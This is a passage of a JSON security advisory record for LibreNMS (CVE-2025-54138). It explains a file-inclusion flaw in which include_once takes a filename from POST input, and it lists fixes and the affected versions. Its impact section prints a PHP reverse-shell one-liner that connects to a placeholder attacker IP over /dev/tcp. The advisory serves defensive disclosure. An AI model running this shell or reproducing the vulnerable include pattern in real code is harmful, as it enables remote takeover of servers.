'.inc.php')) {\n    include_once 'includes/html/forms/' . $_POST['type'] . '.inc.php';\n}\n```\nThis pattern introduces a latent Remote Code Execution (RCE) vector if an attacker can stage a file in this include path — for example, via symlink, development misconfiguration, or chained vulnerabilities.\n\n>  This is not an arbitrary file upload bug. But it does provide a powerful execution sink for attackers with write access (direct or indirect) to the include directory.\n\n# Conditions for Exploitation\n\n- Attacker must be authenticated    \n- Attacker must control a file at `includes/html/forms/{type}.inc.php` (or symlink)        \n\n# Example Impact (RCE)\n\nIf a PHP file or symlinked shell is staged in the include path, an attacker can achieve full remote code execution under the `librenms` user context:\n\n```php\n<?php system('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1\"'); ?>\n```\nhttps://github.com/user-attachments/assets/deb9ccd2-101c-4172-89b1-b840b7ed3812\n\n\n---\n\n# Recommended Fix\n\n- Implement strict allow listing or hardcoded routing instead of dynamically including user-supplied filenames. \n- Avoid passing raw POST input into `include_once`.\n- Ensure the inclusion path is immutable and outside attacker control (e.g., avoid variable expansion into trusted paths).","affected":[{"package":{"name":"librenms/librenms","ecosystem":"Packagist","purl":"pkg:composer/librenms/librenms"},"ranges":[{"type":"ECOSYSTEM","events":[{"introduced":"0"},{"fixed":"25.7.0"}]}],"versions":["1.19","1.20","1.20.1","1.21","1.22","1.22.01","1.23","1.24","1.25","1.26","1.27","1.28","1.29","1.30","1.30.01","1.31","1.31.01","1.31.02","1.31.03","1.32","1.32.01","1.33","1.33.01","1.34","1.35","1.36","1.36.01","1.37","1.38","1.39","1.40","1.41","1.42","1.42.01","1.43","1.44","1.45","1.46","1.47","1.48","1.48.1","1.49","1.50","1.50.1","1.51","1.52","1.53","1.53.1","1.54","1.55","1.56","1.57","1.58","1.58.1","1.59","1.60","1.61","1.62","1.62.1","1.62.2","1.63","1.64","1.64.1","1.65","1.65.1","1.66","1.67","1.68","1.69","1.70.0","1.70.1","21.1.0","21.10.0","21.10.1","21.10.2","21.11.0","21.12.0","21.12.1","21.2.0","21.3.0","21.4.0","21.5.0","21.5.1","21.6.0","21.7.0","21.8.0","21.9.0","21.9.1","22.1.0","22.10.0","22.11.0","22.12.0","22.2.0","22.2.1","22.2.2","22.3.0","22.4.0","22.4.1","22.5.0","22.6.0","22.7.0","22.8.0","22.9.0","23.1.0","23.1.1","23.10.0","23.11.0","23.2.0","23.4.0","23.4.1","23.5.0","23.6.0","23.7.0","23.8.0","23.8.1","23.8.2","23.9.0","23.9.1","24.1.0","24.10.0","24.10.1","24.11.0","24.12.0","24.2.0","24.3.0","24.4.0","24.4.1","24.5.0","24.6.0","24.7.0","24.8.0","24.8.1","24.9.0","24.9.1","25.1.0","25.2.0","25.3.0","25.4.0","25.5.0","25.6.0"],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-gq96-8w38-hhj2/GHSA-gq96-8w38-hhj2.json"}}],"references":[{"type":"WEB","url":"https://github.com/librenms/librenms/security/advisories/GHSA-gq96-8w38-hhj2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-54138"},{"type":"WEB","url":"https://github.com/librenms/librenms/pull/17990"},{"type":"WEB","url":"https://github.com/librenms/librenms/commit/ec89714d929ef0cf2321957ed9198b0f18396c81"},{"type":"PACKAGE","url":"https://github.com/librenms/librenms"},{"type":"WEB","url":"https://github.com/librenms/librenms/releases/tag/25.7.0"}],"database_specific":{"cwe_ids":["CWE-98"],"github_reviewed":true,"github_reviewed_at":"2025-07-21T21:10:51Z","nvd_published_at":"2025-07-22T22:15:38Z","severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}]}
